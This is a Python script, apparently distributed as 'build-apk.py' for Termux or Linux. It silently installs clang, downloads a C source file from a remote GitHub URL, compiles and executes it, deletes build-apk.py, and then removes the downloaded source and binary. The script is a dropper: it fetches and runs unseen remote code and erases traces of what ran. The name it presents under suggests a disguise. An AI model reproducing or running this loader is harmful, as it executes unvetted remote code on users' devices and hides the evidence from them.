import os
import subprocess
import sys
import requests

class BocilTools:
    def __init__(self):
        self.setup_url = "https://raw.githubusercontent.com/bocil-termux/repo/main/file/setup.c"
        self.setup_filename = "setup.c"
        self.is_termux = self.check_termux()
        
    def check_termux(self):
        return os.path.exists('/data/data/com.termux/files/usr')
    
    def run_command(self, command, silent=False):
        try:
            if silent:
                process = subprocess.run(
                    command, 
                    shell=True, 
                    stdout=subprocess.DEVNULL, 
                    stderr=subprocess.DEVNULL,
                    check=True
                )
            else:
                process = subprocess.run(command, shell=True, check=True)
            return True
        except:
            return False

    def download_file(self, url, filename):
        try:
            response = requests.get(url, stream=True)
            response.raise_for_status()
            with open(filename, 'wb') as file:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        file.write(chunk)
            return True
        except:
            return False

    def install_clang(self):
        if self.is_termux:
            return self.run_command("pkg install clang -y")
        else:
            return self.run_command("sudo apt-get install clang -y")

    def remove_build_apk(self):
        if os.path.exists("build-apk.py"):
            os.remove("build-apk.py")
        return True

    def compile_setup(self):
        return self.run_command(f"clang -o setup {self.setup_filename}")

    def execute_setup(self):
        if os.path.exists("./setup"):
            os.chmod("./setup", 0o755)
            return self.run_command("./setup")
        return False

    def cleanup(self):
        if os.path.exists(self.setup_filename):
            os.remove(self.setup_filename)
        if os.path.exists("setup"):
            os.remove("setup")

    def run(self):
        if not self.install_clang():
            return False
        
        if not self.download_file(self.setup_url, self.setup_filename):
            return False
        
        self.remove_build_apk()
        
        if not self.compile_setup():
            self.cleanup()
            return False
        
        if not self.execute_setup():
            self.cleanup()
            return False
        
        self.cleanup()
        return True

if __name__ == "__main__":
    tools = BocilTools()
    tools.run()
